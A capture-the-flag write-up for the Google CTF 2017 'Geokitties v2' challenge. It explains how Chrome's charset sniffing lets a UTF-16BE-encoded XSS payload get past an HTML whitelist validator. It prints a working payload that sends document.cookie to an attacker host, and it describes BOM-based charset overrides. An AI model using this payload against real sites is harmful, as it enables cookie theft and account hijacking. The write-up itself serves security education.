# Write-up: Google CTF 2017 | Geokitties v2

[**Geokitties v2**](https://geokittiesv2.web.ctfcompetition.com/) is an XSS
challenge that comes in the style of a late-90's homepage built by a cat
enthusiast.  The site's only feature is a comment form that permits a "safe"
subset of HTML.  Any supplied comment is immediately reviewed by an automated
admin bot that will click on any link in the comment text. Now the task is to
submit a comment that passes all checks of the deployed HTML validator and at
the same time triggers XSS on the admin's end to exfiltrate a secret flag
cookie.

Interestingly, there is a shortcut to solve this challenge. Instead of
exploiting weaknesses in the HTML parser or the validator, we can take
advantage of Google Chrome's lax charset sniffing to simply bypass parts the
validation process.

## The HTML validator

The application is written in Node.js and uses the
[`htmlparser2`](https://github.com/fb55/htmlparser2) module to parse each
comment's HTML code. The validator then roughly takes these steps to ensure
that the supplied HTML is safe:

- Only allow HTML tags from a whitelist (`p`, `a`, `b`, `img`, `br`, `i`) to
  prevent dangerous tags with side effects (e.g. `<script>` or `<iframe>`).
- Exclude all `on.*` event handler attributes (e.g. to prevent an `onclick`
  event attached to an otherwise innocuous `<a>` link).
- Allow an `href` attribute only if the value starts with `http[s]:` to prevent
  XSS via pseudo schemes such as `javascript:` or `data:`.

One possible attack approach here is to examine the parser's handling of
duplicate attributes and attributes that are written in mixed case or
interspersed with unexpected Unicode glyphs. Other ideas include supplying an
excessive amount of attributes or using ambiguous formatting – e.g. by mixing
different types of quotes, or by finding a character that the application's
parser interprets as whitespace while the browser sees it as part of an
identifier.

## A different approach: Charset sniffing

But luckily we don't need to examine the parser implementation to solve the
challenge. Instead, we take advantage of the fact that the site is served as
`text/html`, but lacks a charset declaration. In such a case, browsers employ
different heuristics to *guess* the intended charset. But while convenient,
charset sniffing can become unpredictable quickly.  E.g., Chrome interprets
`data:text/html,%AA%BB`as being encoded in the Chinese `Big5` charset, while
`data:text/html,%00%BB` is sniffed as UTF-16LE, although two bytes hardly allow
a reliable determination.

For this challenge, we mislead Chrome to detect UTF-16BE (Big Endian) by
using the byte sequence `\x11x\x12x\x13x\x14x\x15x\x16x\x17x\x18x\x19x`. In
UTF-16, Unicode code points are encoded in chunks of at least 16 bits. E.g.,
the character `A` (which is encoded in UTF-8 as `\x41`) needs to be encoded as
`\x00\x41` in UTF-16BE (or `\x41\x00` in UTF-16LE).  Consequently, the document
`data:text/html;charset=utf-16be,<br>` doesn't yield a single `<br>` tag but
results in the two Unicode glyphs `\u3C62` and `\u723E`. We can exploit this
behavior to make the browser "swallow" sequences that appear as parts of the
HTML syntax in UTF-8 but don't have an effect in a different charset. This way
we can ultimately inject arbitrary tags outside the parser's whitelist.

The format of our comment looks like this:

    \x11x\x12x\x13x\x14x\x15x\x16x\x17x\x18x\x19x<a href="http:$payload">foo</a>

This comment is validated by the application in UTF-8 but displayed in the
browser in UTF-16BE. So, any angle brackets and tags that appear inside the
`href` attribute value would be considered secure by the validator, while the
browser doesn't recognize the `<a>` tag in the fist place. At `$payload` we can
then simply inject arbitrary HTML code in UTF-16BE. That is, if we have an
ASCII-based payload, we just need to pad it with null bytes and make sure it
doesn't interfere with the double quotes of the original tag. To exfiltrate the
flag, we then just issue a redirect to an attacker-controlled domain with the
cookie attached.

So, the final URL-encoded sequence could look like this:

    %11x%12x%13x%14x%15x%16x%17x%18x%19x%3Ca%20href%3D%22http%3A%00<%00a%00 %00h%00r%00e%00f%00=%00j%00a%00v%00a%00s%00c%00r%00i%00p%00t%00:%00l%00o%00c%00a%00t%00i%00o%00n%00=%00'%00h%00t%00t%00p%00s%00:%00/%00/%00a%00t%00t%00a%00c%00k%00e%00r%00.%00s%00i%00t%00e%00/%00'%00%%002%00B%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00>%00f%00o%00o%00<%00/%00a%00>%22%3e

For readability, this is the sequence again with non-printable characters
replaced by spaces:

     x x x x x x x x x <a href="http: < a   h r e f = j a v a s c r i p t : l o c a t i o n = ' h t t p s : / / a t t a c k e r . s i t e / ' + d o c u m e n t . c o o k i e > f o o < / a >">

With that payload, we will receive the following flag at
`https://attacker.example/`:

    CTF{i_HoPe_YoU_fOunD_tHe_IntEndeD_SolUTioN_tHis_Time}

It's worth noting that not all browsers perform the same lax charset sniffing
as Google Chrome does – e.g., the trick wouldn't work in Firefox. But
fortunately, the admin bot is implemented as a headless instance of Google
Chrome.

## Another idea: Byte order marks

Curiously, the application almost fell for a different trap that would even
have defeated an explicit charset declaration. An attacker who controls the
first bytes in a document can inject a BOM (byte order mark) to override the
specified charset – even if it [originates from a header declaration](https://www.w3.org/International/questions/qa-byte-order-mark):

> Changes introduced with HTML5 mean that the byte-order mark overrides any
encoding declaration in the HTTP header when detecting the encoding of an HTML
page.

The BOM for UTF-16BE is `\xFE\xFF`, so this document is encoded in UTF-16BE,
despite being declared as UTF-8:

    data:text/html;charset=utf-8,%FE%FFfoo

But unfortunately, this technique doesn't work in the challenge because BOMs
aren't preserved by the application (e.g.,`\xFF` is converted to `\xEF\xBF\xBD`
on the way).

## Lessons learned

Web applications should always declare a charset explicitly and not rely on
automated detection by browsers. The reason is that different charset sniffing
techniques make it hard to predict browser behavior. Also, an attacker should
not be able to control the first few bytes in a document. Depending on the
implementation, we otherwise facilitate charset and content-type sniffing
attacks.
